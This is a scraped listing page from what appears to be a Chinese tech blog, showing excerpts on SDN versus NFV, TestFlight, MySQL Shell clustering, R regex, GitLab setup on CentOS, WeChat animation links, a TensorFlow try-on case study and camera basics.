			<a href="/posts/462fa35be0a553692417387859edd1d2/" rel="bookmark">
			SDN与NFV之战
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言
在过去的20年中，网络出现了缓慢而有条不紊的变革步伐，每套新技术应运而生，有序地超过了前一代。但是今天，两种新技术，即软件定义网络（SDN）和网络功能虚拟化（NFV），准备通过将网络从物理变为虚拟来真正颠覆这一步伐。在企业市场中，关于这两者之间的差异似乎有很多争议，通常人们将两者进行比较，并极力推崇其中的一种。如果您想对比这两种新兴的网络方法到底孰优孰劣，那么您来错了地方。
SDN和NFV彼此有很多共同点。实际上，两者可以共存于相同的网络环境中，并具有许多相同的特征和组件。主要的不同点在于出发点以及部署场景。两种方法都有一个相似的目标：降低网络的成本，复杂性和刚性，使用易于部署，管理，重新配置和排除故障的虚拟覆盖层增强物理网络-所有这些都具有较低的OpEx和CapEx配置文件。
1.SDN：重量级 SDN是这场战斗中无可争议的重量级人物，因为它获得了更多媒体关注和专栏文章。这更是“最重要的”。从2005年开始，它就拥有了先行者优势。通常，您会看到短语“出生于校园，已在数据中心成熟”应用于SDN。从某种程度上说，这起源于学术界的想法可能会导致人们得出这样的结论，即这是理论性的而非实际的，但这与事实相去甚远。SDN在获得广泛市场认可方面还有很长的路要走，但它非常强大，并且超大规模数据中心正在部署它来解决其网络挑战。
SDN的目标是在网络体系结构中将控制平面与数据转发平面分离。这为网络的部署和管理带来了更大的灵活性，但最重要的是，它允许将许多SDN组件部署在行业标准的x86服务器上。SDN控制器是类似于操作系统的软件，实际上管理着软件定义网络的各个方面。像Big Switch Networks，Cisco，HP，IBM，Juniper和VMware这样的公司都提供SDN控制器。此外，Floodlight和OpenDaylight等项目也提供了开源控制器。（单击此处查看OpenDaylight的视图）。在SDN中，控制器在x86服务器上托管的虚拟机（VM）上运行，也可以在裸机（x86或其他网络设备）上运行。
尽管SDN可以从机架的顶端一直延伸到服务提供商，但两个最普遍的用例是连接远程位置并简化现有数据中心内部的联网。在这两种用例中，后者是简化，而在大规模部署的场景上，SDN则具更有希望。如今，当客户在其网络上部署，移动，重新配置或处理几乎任何任务时，物理人工去操作服务器不仅耗时且昂贵，而且物理接触会带来潜在的错误。SDN创建了一个虚拟叠加层，可以更好地编排基于规则的动作，从而将人为因素排除在外，并允许在几秒钟而不是几分钟，几小时或几天内进行更改。
如今，客户在机架式交换机的行尾和顶部花费了大量资金，但在SDN领域，由于SDN控制器完成了许多繁重的工作，因此可以降低成本，减少使用功能繁多的交换机，从而节省了大量资金为企业赚钱。从低端（如Pica8等公司）到网络播放器（如HP或Dell）到思科或Juniper的高端选择，都有广泛的OpenFlow兼容交换机可供选择。根据购买的规模，像Google这样的超大规模数据中心实际上已经签约，根据他们需要或者不需要的特定功能构建自己的交换机。
2.NFV：挑战者 NFV代表网络功能虚拟化。您可能会认为下面的描述听起来与SDN相似。现在，您可以看到两者的边界重叠的内容。该技术方向于2012年推出，是一个相当新的方向，但它具有更精简的受众群体和更大的机会。人们通常说NFV是由服务提供商创建的，这么说的依据显然是服务提供商的痛点。当服务提供商将其连接到新位置时，客户需要在内部进行部署，其中包括托管路由器和电信级以太网划分设备。（分界设备至关重要，因为这会在客户网络和运营商网络之间形成一条“沙线”。）
除这两部分外，可能还需要安装其他设备，以使服务提供商能够监视，管理连接以及流量并进行故障排除。通常，当服务提供商添加其他客户或位置时，会安装某些设备。不幸的是，大多数部署最终都需要添加一些特殊的设备，因此，从采购和服务的角度来看，支持矩阵对于服务提供商而言变得相当大。NFV通过将网络功能虚拟化为可在COTS（现成商用）x86服务器上运行或作为在这些服务器上运行的虚拟机的软件应用程序来帮助应对这一挑战。
借助NFV，运营商可能只需要划分网络接口设备，就可以将其余功能存储在服务提供商的位置，并利用SDN来简化和管理该网络，客户。
无论服务提供商还是客户要通过NFV来管理其网络，都可以将连接从少数专有的物理设备转移到仅一个或两个物理设备，而其余功能实际上可以通过软件来处理。
3.高层比较 SDNNFV焦点 数据中心
服务供应商
战略 拆分控制和数据转发平面
用软件替换网络设备
协议 开放流
尚未确定，是否支持OpenFlow
应用程序运行 在行业标准的服务器或交换机上
在行业标准的服务器上
客户利益 降低复杂性和成本，提高敏捷性
降低复杂性和成本，提高敏捷性
首要倡议的支持者 企业网络软件和硬件供应商
电信服务提供商
业务发起人 企业IT
服务提供者
4.共同点和不同点 正如我们已经说过的，这两种方法之间有很多相似之处，两者都侧重于使数据通信更易于部署，管理和更改，同时还降低了成本。两种方法都侧重于用运行在行业标准服务器硬件或服务器上托管的虚拟机上的软件替换专有网络设备。在任何一种情况下，将物理平台替换为x86驱动的平台都是成功的基础。通过在戴尔，惠普或IBM等服务器OEM的COTS设备上的VM中的虚拟机中部署虚拟化网络，服务提供商可以减少他们如今面临的设备差异，简化支持和采购，这对购置成本和运营成本均产生重大影响。
当前，由于网络的变化步伐，加上平台种类的巨大变化，对于最终用户和服务提供商而言，问题都变得越来越难以解决。当加上高昂的成本（由于设备的专有性），更长的摊销周期和更高的服务成本，网络将更深地吞噬公司的预算（服务成本通常等于平台总成本的百分比）。网络成本阻碍了企业发展和扩展规模的能力。
在以云为中心的世界中，分界线两侧的公司都被迫加快响应速度，财务障碍可以通过基于软件的功能来弥补，从而可以更快地适应新功能。这使企业可以快速发展，而不必等待设备完全贬值再进行基础设施改进之前就停滞不前。
两种选择都可以利用OpenFlow协议，这是一个自然的连续过程，它使服务提供商可以提供更加灵活的托管IP服务，特别是对于无法管理自己的IT基础结构的小型客户而言。
两种方法的不同之处始于倡议背后的组织。SDN最初是由在测试不同解决方案时不断更改网络基础架构的需求所驱动的。研究人员意识到，通过将控制平面与数据转发平面分离并虚拟化所有连接，他们可以消除网络的硬线障碍，并快速更改结构以适应其需求。SDN主要集中在从核心到服务器。作为新云，大数据随着集成应用程序开始推动服务器之间的更多通信，将某些控制权降低到服务器级别的能力意味着网络可以利用更多的东西向通信，从而减少南北向通信量并加快运行速度。SDN背后的主要推动力是软件供应商，例如Big Switch Networks和VMware（通过收购Nicira）。诸如Cisco，HP，IBM和Juniper之类的硬件供应商也参与其中，但是在了解谁从SDN驱动的世界中受益最大的时候，很明显，硬件参与者并不总是在这个阵营中。（以下是我们对思科针对SDN的独特挑战的看法。）尽管硬件供应商开始涉足SDN，但他们很可能将这视为对冲，就像服务器OEM早期致力于服务器虚拟化一样。只需访问供应商的网站，就可以洞悉业务与SDN的融合程度。比如搜索术语“ SDN”或尝试www.vendorURL.com/SDN并查看结果。IBM词条结果内容丰富，显然正在接受该战略。对Cisco.com的搜索返回“您是说ISDN吗？” 在搜索结果顶部以红色显示。
对于NFV，需求是由诸如Deutsche Telekom和BT Group之类的运营商推动的，他们发现，成本和复杂性阻碍了其与更多客户进行盈利扩展的能力。在部署中，功率也经常成为更主要的因素。需要进行更改。NFV通过欧洲电信标准协会（ETSI）在欧洲开始。作为运营商驱动的计划，主要重点是如何虚拟化网络功能（主要是在运营商和客户网络之间的边界），以实现更高效和可扩展的部署。NFV的主要支持者是AT＆T，BT集团，Deutsche Telekom，Orange，意大利电信，Telefónica和Verizon。尽管虚拟化也是该组的主要推动力，但主要目标不是数据和控制的分离，而是设备的标准化。在设备级别上，更主要的重点是驱动通用性和商品化，并用虚拟代替物理，然后更改路由执行。
提供商今天部署的许多专有平台已经建立在x86架构上（并运行在Linux版本如Wind River或MontaVista上）），因此将该平台移植到虚拟机的能力应该相对简单。但是，对于设备制造商而言，这从等式中删除了收入部分，还减少了最终客户转换的障碍。如果解决方案是一个完整的平台，则通过每一代硬件最终用户的转换成本都会更高，但是当该产品成为纯粹的软件解决方案时，客户可以随时随地迁移到竞争对手的产品，不只是在平台摊销或平台世代变更时。在像SDN或NFV这样的以软件为中心的解决方案领域，供应商可以更轻松地“购买”竞争对手的安装，因为这不需要资本支出。
5.供应商影响 这对网络世界意味着什么？显然，将发生功能转变，因为供应商需要使用适合这些类别需求的解决方案来扩大其产品组合（与许多人一样）。
但是，对于供应商来说，有一个强烈的警示故事。双方的选区，最终客户和服务提供商正在使他们的需求变得清晰。今天的网络过于昂贵，僵化和专有。它阻碍了企业的全面发展。这意味着NFV和SDN解决方案给这些现有产品带来了极大的破坏力。
当前的大部分收入流都与网络硬件相关联，而网络硬件通常基于标准IT工作负载是可以接受的。但是，随着诸如云计算和大数据之类的技术继续得到重视，世界正从台式机客户端访问设备转变为平板电脑和智能手机等移动设备，后端环境需要迅速改变以跟上步伐。这将需要更灵活的网络解决方案，这将在近20年来首次破坏市场。那些可以迅速采取行动以应对不断变化的客户需求的供应商将受益，而那些试图坚持“美好的过去”的供应商可能会发现自己的份额和收入正在下降。
供应商需要制定一种解决网络虚拟化的策略（适用于其产品），但是该策略需要专注于新产品和新部署，而不是简单地将旧平台改造成这些新部署方案。SDN需要成为针对数据中心的新网络产品的焦点，而NFV应该成为针对服务提供商的产品的主要关注点。
近期，大多数SDN部署都将重点放在未开发的机会上，并且不会被改造到现有的数据中心中。尝试NFV的运营商将首先通过新的部署推出该产品。他们不会撤出现有未摊销的设备，因此供应商需要在一定程度上查看其产品。
6.未来 由于某些原因，我们对未来的看法与今天的立场截然不同。首先，在平台，软件和网络级别发生了一些根本性的事情，这些事情今天都在发生。未来的面貌尚待商榷，但将您今天的现状与部署的50％以上服务器平台中的虚拟化以及驱动Web和云应用程序的大型超大规模数据中心进行比较时，可以肯定地说，最后一个十年将给IT带来了巨大的变化。未来十年将带来同样多的破坏。SDN和NFV将在这一现实中占有一席之地，但是只有在我们可以与其他明显推动市场发展的技术趋势之间找到平衡的程度。
就像我们说过的那样，NFV的接受门槛要低得多，这取决于谁购买和部署的动态。以下是一些因素会推动SDN的接受或减慢其进展：
超大规模数据中心–这是采用SDN的首批部署场所，但并非每个企业客户都以这种规模运行。他们的应用程序（和部署）的同质性使其非常适合这些实验。Google或Facebook建立自己的解决方案很容易，但是当您沿着食物链转移到常规的公司数据中心时，规模经济将无法以相同的方式获得回报。这些客户是未来的预兆还是离群值？我们认为，现在开始将这种超大规模趋势转换到其他市场为时尚早。托管云解决方案–随着越来越多的公司涌向“云”或在其数据中心之外寻找托管云解决方案，他们在其原有环境中进行重大网络改造的可能性将下降。SDN可能会在不久的将来在云环境中占据统治地位，但是如果将服务从本地迁移到云解决了当今许多当前的数据中心挑战，那么是否有解决保留遗留环境的需求？同时，请看一下大型机技术。在这一领域没有太多的新发展，相反，它主要包括正在进行的操作和维护。运行Exchange，SAP，Oracle和SQL Server等应用程序的旧数据中心是否遇到相同的命运？微服务器 –长时间以来机架密度一直在上升，这加剧了当今的网络问题。1和1 / 2U服务器现在在主流应用程序部署中很常见，这意味着机架密度通常可以在每个机架40-80个系统范围内-每个服务器都具有多个物理以太网连接。但是微型服务器是基于机架的，其结构允许多达40到750多个服务器共享一组高带宽以太网连接。如果微型服务器变得越来越流行，则创建的内部机箱结构将处理大部分I / O，从而在机箱级别聚合以太网。这消除了许多现有的网络问题（即瓶颈），并降低了SDN的价值（更重要的是ROI）。40Gb和100Gb以太网部署–半导体领域里有一句话：“大容量缓存可以弥补很多低效率的问题。” 大管子呢？在当今世界上，大多数公司网络仍在处理每台服务器的多个1GbE连接，并且刚开始将10GbE降低到服务器上时，效率和瓶颈是关键问题。但是，当每台服务器都有自己的高速公路并且返回核心的路由又宽又快时，难道不能仅通过南北流量吗？如果网络带宽增加4倍或10倍，对SDN的需求会有所下降吗？英特尔按服务器分类的服务器–英特尔最近宣布了一项战略，该战略有可能改变机架级别的情况。这项新策略依赖于硅光子技术，如今可提供约6-12GB / s的吞吐量（将来有可能将其提高到100GB）。这可以完全消除等式中的机架顶部和行尾切换。这样做实质上消除了对SDN的大部分需求（但是NFV在与服务提供商的连接中仍然可行）。显然，由于从外形尺寸的角度来看服务器格局处于不断变化的状态，因此客户可能要先观察服务器端的情况，然后才能进入网络，因为网络位于中间（相对于边缘的服务器）并触及更多点。 7.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/462fa35be0a553692417387859edd1d2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e31f71ecd565b76d173f301c31ab768/" rel="bookmark">
			有没有办法找回testflight之前测试的软件_苹果testflight使用技巧，你需要知道这些、、...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		TestFlight 是苹果旗下的应用测试平台，能帮助开发者邀请用户对 App 进行测试，方便开发者更好地改进和完善 App。
目前TestFlight 包括iPhone 和 iPad以及 Apple TV 版，对开发者和测试人员来说，都是免费的。参与测试应用，只需三步：接受邀请，安装测试，提供反馈。
参与应用测试是件有趣的事情，可以优先使用应用软件的最新功能，向开发者发送测试反馈，提供建议补充，帮助心仪的软件不断完善。
如何参与应用软件的TestFlight 测试呢？如何获取应用软件TestFlight 测试资格呢？
为了更好的帮助新手朋友使用TestFlight ，小编写了一些TestFlight 使用技巧，有兴趣的了解一下。
1下载及账号 首先，你需要在App Store 下载TestFlight 这个软件，才能参与其他软件的TestFlight 测试。TestFlight 就相当于一个测试的商店。
在App Store 登录您的Apple ID，这个ID 是你用来参与测试的ID，TestFlight 跟随App Store ID 。注意：这些与iCloud 无关。
或者在iTunes 登录您的Apple ID，这个ID 是你用来参与测试的ID。
2，邀请测试需要兑换码 TestFlight 目前的软件测试方式分为邀请测试和公开测试。
其中邀请测试，需要填写测试兑换码才能参与。
开发者进行TestFlight 邀请测试，发布消息的渠道是多样性的，根据个人喜好来决定。例如有的开发者喜欢使用谷歌表单，有的使用腾讯表格，有的则在把TestFlight 测试申请放在软件内。最终目的是让开发者收集测试人员提供的邮箱，添加到测试成员名单里面。
值得注意的是，大部分时候你填写的邮箱，仅仅用来接收邮件使用，你参与测试的Apple ID 以当前App Store 登录的账号为准。
开发者将你的邮箱添加到测试人员列表内，你会收到一封来自TestFlight的邮件。邮件包含软件简介、测试内容等等。点击邮件内的“View in TestFlight”，可以看到使用步骤，以及兑换码。兑换码用于填入TestFlight 软件内兑换参与测试。
打开TestFlight ，点击Redeem（兑换），会弹出输入框，将邮件内收到的兑换码粘贴进去，然后点击Redeem 来完成，输入正确，安装软件就可以参与测试了。
3，参与公测无需兑换码 在2018年9月份，苹果对TestFlight 增加了公开测试功能，通过TestFlight 的公开测试链接，无需填写兑换码的，我们可以很方便的参与App 测试。，
在Safari 打开应用的公开测试连接地址，点击“开始测试”，跳转到TestFlight 应用中，点击“INSTALL”安装，就可以参与该应用的测试了。
4，设备与应用的管理 参与软件测试，软件的安装、更新、停止测试，都在TestFlight 这个App 中进行，TestFlight 就相当于一个测试的App Store。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6e31f71ecd565b76d173f301c31ab768/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/151cf6261deec6fff846a49aa90b9d31/" rel="bookmark">
			mysql集群搭建_MySQL Shell 副本集 和 MGR 快速搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文链接：MySQL Shell 副本集 和 MGR 快速搭建 本文为原创文章，如有转载请标明出处。
简介 MySQL Shell是MySQL Server的高级客户端和代码编辑器。除了和mysql命令行客户端程序一样，使用常规的SQL功能外，MySQL Shell还提供了JavaScript和Python的脚本功能，并包含多个API，其中的AdminAPI用于操作InnoDB Cluster。
安装部署 下载：https://dev.mysql.com/downloads/shell/
安装
#tar -zxvf mysql-shell-8.0.20-linux-glibc2.12-x86-64bit.tar.gz -C /opt/idc/mysql-shell8.0.20 ####配置 #vi /etc/profilt export PATH=/opt/idc/mysql-shell8.0.20/bin:$PATH #Source /etc/profile 说明：https://dev.mysql.com/doc/mysql-shell/8.0/en/mysql-shell-connections.html
备注：是不是很简单，但需要注意每个mysql版本都有对应shell版本。建议对应版本使用。shell 是跟着mysql版本进行维护的。
ReplicaSet：只能搭建主从架构 通过shell脚本 搭建主从
创建集群
[root@ens8 idc]# mysqlsh MySQL Shell 8.0.20 Copyright (c) 2016, 2020, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/151cf6261deec6fff846a49aa90b9d31/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df621bc8e4df84da6d8a84304d3db3a8/" rel="bookmark">
			r语言 rgl 强制过程中_R语言正则表达式：提取括号中的内容
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者：黄天元，复旦大学博士在读，热爱数据科学与开源工具（R），致力于利用数据科学迅速积累行业经验优势和科学知识发现，涉猎内容包括但不限于信息计量、机器学习、数据可视化、应用统计建模、知识图谱等，著有《R语言高效数据处理指南》（《R语言数据高效处理指南》(黄天元)【摘要 书评 试读】- 京东图书）。知乎专栏：R语言数据挖掘。邮箱：huang.tian-yuan@qq.com.欢迎合作交流。
如果需要使用R语言进行文本挖掘和自然语言处理，那么字符串的操作时必不可少的，而其中一个重要内容就是使用正则表达式来匹配字符串中相应的内容，从而进行提取。在R语言中，能够完成这项工作的有基本包中的grep，stringr的str_extract等。这里首推stringr包，因为它具有更加直观的语法结构。下面给出两个较为好的资料的链接：
https://github.com/rstudio/cheatsheets/blob/master/regex.pdf​github.com https://github.com/rstudio/cheatsheets/blob/master/strings.pdf​github.com 这两份资料基本涵盖了大部分的应用，不过很多时候如果不够熟练，还是要经常查表才能够知道怎么做。这里就提一个实际例子：如何提取文本中括号中的字符串信息呢？
例子：字符串为"hello world (lalala)"，现在想要得到里面的“lalala”。
传统思维（注意括号是保留字符，因此需要双反斜杠，即“(”和“)”。此外，因为要临近括号的内容，因此不能贪婪，要懒惰，所以要用“.+?”，之所以用了加号“+”（而非乘号“*”），是因为如果里面没有东西就不要提取其中的空字符“”了）：
library(stringr) string1 = "hello world (lalala)" str_extract(string1,"(.+?)") [1] "(lalala)" 但是我并不想要括号，以前对正则表达式不熟悉的我，一般只能再次使用定位的方法去掉括号，也就是说：
library(tidyverse) string1 = "hello world (lalala)" string1 %&gt;% str_extract("(.+?)") %&gt;% str_sub(2,-2) [1] "lalala" 嗯，这个方法用了很久了已经。感觉问题也不大，即从所得结果中再提取第二个字符到倒数第二个字符的内容，就把括号去掉了。
但事实上，本来是可以一步到位的，即：
str_extract(string1,"(?&lt;=().+?(?=))") [1] "lalala" 尽管一步到位了，但是要理解它，需要有基本功底。即，需要知道(?&lt;=)和(?=)这两个分别代表什么意思。这个东西叫做零宽度断言(前后预查)，具体内容可以参考下面这份资料：
ziishaned/learn-regex​github.com 用语言来解释，就是在“(”之后而且在“)”之前的最短非空内容。所以要清楚这里面哪些括号有对应关系，才能够理解这个正则表达式（"(?&lt;=().+?(?=))"）的真正意思。
以上内容参考了Extract info inside all parenthesis in R，特别致谢~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43008a7f4d1e27fb9f624de40830b4a7/" rel="bookmark">
			CentOS下GitLab搭建及配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由于公司业务，需要上Git版本控制。
目前市面上比较有名的Git服务提供商，国外有GitHub、BitBucket、GitLab，国内有Coding。现有的服务商，对于免费的套餐都有一定的限制。比如：GitHub只允许建立免费的开源repository，建立私有的仓库需要收费。BitBucket允许建立无限制的私有项目，不过对于项目中参与的开发人员是有人数限制的，当团队中开发者规模达到一定数量后，需要付费购买相应的套餐。 GitLab社区版是免费的，不但能建立免费的私有仓库而且没有数量上限，参与人员也没有数量限制，还能设置成员的权限，甚至细致到具体某条分支的权限，以及强大的工作流等等。
GitLab很适合中小型非开源项目公司。
一、GitLab 简介 GitLab 是一个利用Ruby on Rails 开发的开源版本控制系统，实现一个自托管的Git项目仓库，可通过Web界面进行访问公开的或者私人项目。
它拥有与GitHub类似的功能，能够浏览源代码，管理缺陷和注释。可以管理团队对仓库的访问，它非常易于浏览提交过的版本并提供一个文件历史库。团队成员可以利用内置的简单聊天程序（Wall）进行交流。它还提供一个代码片段收集功能可以轻松实现代码复用，便于日后有需要的时候进行查找。
开源中国代码托管平台 码云 就是基于GitLab项目搭建。
GitLab 分为 GitLab Community Edition(CE) 社区版 和 GitLab Enterprise Edition(EE) 专业版。社区版免费，专业版收费，两个版本在功能上的差异对比，可以参考官方对比说明
二、GitLab 安装和配置 安装社区版，GitLab CE 版本：9.2.6
1、GitLab安装 通过GitLab官方提供的Omnibus安装包来安装，相对方便。Omnibus安装包套件整合了大部分的套件（Nginx、ruby on rails、git、redis、postgresql等），再不用额外安装这些软件，减轻了绝大部分安装量。
GitLab官方安装文档 ：CentOS6.x系统
安装依赖包，并配置postfix服务为GitLab邮件服务 # yum install curl openssh-server openssh-clients postfix cronie # service postfix start # chkconfig postfix on 打开HTTP和SSH端口 # iptables -I INPUT -m tcp -p tcp --dport 22 -j ACCEPT # iptables -I INPUT -m tcp -p tcp --dport 80 -j ACCEPT 两种安装源 从官方镜像源安装 添加GitLab仓库并安装到服务器上
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/43008a7f4d1e27fb9f624de40830b4a7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a59fd5188b8d47ec3f1267eaf0f6974/" rel="bookmark">
			微信小程序: 动画效果集合(收集的,说不定会用上)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		微信小程序：心跳动画
https://blog.csdn.net/wtdask/article/details/82734944
文字跑马灯效果：
http://www.wxapp-union.com/portal.php?mod=view&amp;aid=1038
触摸水波涟漪效果：
http://www.wxapp-union.com/portal.php?mod=view&amp;aid=1350
下拉菜单效果：
http://www.wxapp-union.com/portal.php?mod=view&amp;aid=1875
五星评分效果：
http://www.wxapp-union.com/portal.php?mod=view&amp;aid=1876
数字累加，动态效果：
http://www.wxapp-union.com/forum.php?mod=viewthread&amp;tid=1694
星战字幕效果：
http://www.wxapp-union.com/forum.php?mod=viewthread&amp;tid=1689
动画卡片效果：
http://www.wxapp-union.com/forum.php?mod=viewthread&amp;tid=2193
列表项左滑删除效果：
http://www.wxapp-union.com/forum.php?mod=viewthread&amp;tid=2189（更多左滑删除效果请直接在论坛内搜索“左滑”即可）
图片的滤镜效果：
http://www.wxapp-union.com/forum.php?mod=viewthread&amp;tid=3949
黑客帝国metrix效果：
http://www.wxapp-union.com/forum.php?mod=viewthread&amp;tid=4670
CSS3动画效果：
http://www.wxapp-union.com/forum.php?mod=viewthread&amp;tid=4628
仿直播点赞气泡效果：http://www.wxapp-union.com/forum.php?mod=viewthread&amp;tid=2833
文字弹幕效果：
http://www.wxapp-union.com/forum.php?mod=viewthread&amp;tid=4713
仿UC宣传页面的简单动画效果：
http://www.wxapp-union.com/forum.php?mod=viewthread&amp;tid=4266
发短信验证码倒计时：
http://www.wxapp-union.com/portal.php?mod=view&amp;aid=1671
弹出菜单特效：
http://www.wxapp-union.com/portal.php?mod=view&amp;aid=1659
滚动动画：
http://www.wxapp-union.com/portal.php?mod=view&amp;aid=1538
实时圆形进度条：
http://www.wxapp-union.com/portal.php?mod=view&amp;aid=1456
遮罩层：
http://www.wxapp-union.com/forum.php?mod=viewthread&amp;tid=3617
仿Table效果：
http://www.wxapp-union.com/portal.php?mod=view&amp;aid=1038
操作按钮悬浮固定在底部：
http://www.wxapp-union.com/portal.php?mod=view&amp;aid=1029
支付倒计时效果：
http://www.wxapp-union.com/portal.php?mod=view&amp;aid=890
文字单行背景自适应带角标：
http://www.wxapp-union.com/portal.php?mod=view&amp;aid=636
侧边栏滑动特效
http://www.wxapp-union.com/forum.php?mod=viewthread&amp;tid=1202
顶部导航效果：
http://www.wxapp-union.com/portal.php?mod=view&amp;aid=1665
弹出和隐藏动画：
http://www.wxapp-union.com/portal.php?mod=view&amp;aid=1449
切换动画：
http://www.wxapp-union.com/portal.php?mod=view&amp;aid=1113
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ad74b9814916b2144f4d07d3099ba7a/" rel="bookmark">
			tensorflow图像分割unet_案例分享 | 知衣科技利用 TensorFlow 构建 3D 试衣
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言：知衣科技是一家致力于应用图像技术、时序分析、个性化推荐等人工智能技术为服装行业客户提供最新最前沿数据分析服务的公司，人工智能技术是知衣科技的基因，知衣科技希望通过不断的技术创新，为服装行业客户带来更好的智能服务。
服装设计的痛点
在服装行业中，服装设计效果确认是一个费时费力的高成本工作。
在一件服装版型确定后，需要为服装添加上图案或者底色，从而得到一个完整的服装设计效果。一般设计好的服装设计稿为多张矢量图，想要看到实际的服装效果一般需要将设计效果图给到打版工作室或者相应的工厂, 进行服装样衣的制作。制作完成后，设计师才可拿到真实样衣并分析服装的问题。一般来说进行服装样衣制作成本与时间都比较高，因此无法批量尝试不同的选择。此外，设计师拿到样衣后会对之前的颜色、图案与一些设计细节等信息进行一定修改，修改完成一般还可能需要进行二次打版。服装设计中这个过程会不断被重复，并不断进行样衣制作，问题发现修改样衣制作的循环过程中，整个过程成本高昂，同时费时费力，大大拉长了服装的设计生产周期。
知衣科技基于 TensorFlow 开发了基于图像的 3D 智能试衣技术，帮助服装从业者缓解这个问题。本文大致介绍系统问题定义分析、模型构建与模型训练等过程。
问题定义与解决思路
2.1 问题定义 在服装设计过程中，痛点在于光看设计图稿无法了解服装设计完成后的实际效果，所以一般都需要进行打版，拿到实际样衣并穿在模特身上才知道实际的效果。如果可以直接从已有上身效果图中替换样衣上的颜色与图案能够帮助设计师快速验证设计结果，大幅度缩短设计生产周期。
此处我们以颜色与服装图案为例，来研究元素替换问题。一般而言服装上的颜色有局部与整体，图案也有局部与整体的区别。如何将颜色信息与图案信息添加到服装图像上，一般可以采用贴图的方案, 直接将色块 / 图案直接贴到原图中, 贴图是一个比较快捷方便的解决方案。但是贴图会带来两个问题。
第一个问题是如何来区分服装与背景边界。这个问题是一个相对成熟的图像分割问题，可以通过图像分割技术来进行边界判别，区分边界与服装部分。另一个问题是贴图是平面类型的，会覆盖服装的细节信息，同时会丧失真实感，如下图所示：
图 1 贴图 3D 试衣
从图 1 可以看出，一件衣服替换颜色信息为黑色后，虽然整件衣服是黑色，但是如果每一个像素的颜色都是一样的，那看起来会非常生硬。针对贴图问题，主要原因在于贴图无法察觉到服装上每个像素点之间的差异，贴图时每个点做了同样的对待。解决方法可以对图中的服装计算一下每个点的重要程度，得到一张服装权重图，然后将服装权重图与贴图做一个乘法，即可做一个良好的转换。
针对服装权重这边，比较好的做法是使用服装的深度信息做为服装本身的权重，深度信息可以反映服装图上每个点的特异信息，同时因为我们的图像一般使用普通相机拍摄，没有自带绝对的深度信息, 所以我们通过单张图做深度估计，得到单目的相对深度信息，效果如下图所示：
图 2 服装图像单目深度信息
深度图中每个点反应是真实图像中每个点距离人眼的相对距离远近，通过深度信息使得视觉看起来更具有真实感，而不是平铺的感觉。
获取到了深度信息，我们在贴图与变色时，即可消除没有真实感的问题。但是因为服装上本身一般会自带颜色与一些简单图案的关系，如果不做消除，直接贴图或者上色，原始服装上的图案颜色也会继续存在在上色的服装中，如图 3 所示。
图 3.1 添加图案效果对比图
图 3.2 添加颜色细节效果对比图
图 3.1 从左往右依次为原图，未去除图案叠加新图案效果图，去除图案叠加新图案效果图，图 3.2 从左到右为原图，未去除图案上色效果图，以及去除图案上色效果图。从图中很明显看出，没有去除图案时无论是添加图案还是上色，在原图中均保留了原始图像的痕迹，导致效果变差。所以我们一般也需要将原始服装上的颜色给抹除，变成灰度或者白色的服装，以方便调整原始服装的纹理和颜色。
2.2 解决思路
综合上述分析， 我们需要解决的问题有 3 个： 需要对原始图像做服装分割操作需要对服装数据做相对的单目深度估计需要对服装数据做颜色图案信息擦除
上述 3 个问题都可以看成是 Img2Img 任务。a 任务可以使用分割模型进行解决，b 任务和 c 任务可以自行构建类似 FCN、UNet 等结构进行解决。常规思路我们需要训练 3 个模型来解决这 3 个问题。先由分割模型将原始图像中的服装分割出来，然后将分割得到的服装分别送入 b 任务模型和 c 任务模型中，最后合并 b 任务和 c 任务的输出，得到最终的结果。这个思路最简单也比较方便，多个任务可以并行处理，也能单独对每一个模型进行调整。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5ad74b9814916b2144f4d07d3099ba7a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/40cb3e80b1d9a1249d1b9ca8bf77070c/" rel="bookmark">
			摄像头工作原理及isp相关知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转载地址：https://blog.csdn.net/wangliang888888/article/details/103695002
本文转自http://bbs.elecfans.com/jishu_1848707_1_1.html
一：摄像头的基本知识
1：摄像头结构
常用的结构如下图所示，主要包括镜头，基座，传感器以及PCB部分。
2：摄像头模组的种类
CCM分为4种：FF、MF、AF和ZOOM。FF（Fix Focus），定焦摄像头，是国内目前用的最多摄像头，用于30万和130万的手机产品。MF（micro Focus），两档变焦摄像头，主要用于近景拍照，如带有名片识别以及条形码识别的手机上，用于130万和200万的手机产品。AF（Auto Focus），自动变焦摄像头，主要用于高像素手机，同时具有MF的功能，用于200万和300万的手机产品。Zoom（Auto Zoom），自动数码变焦摄像头，主要用于相机手机，类似于相机影像的品质，用于300万以上的手机产品。
3：摄像头的工作原理
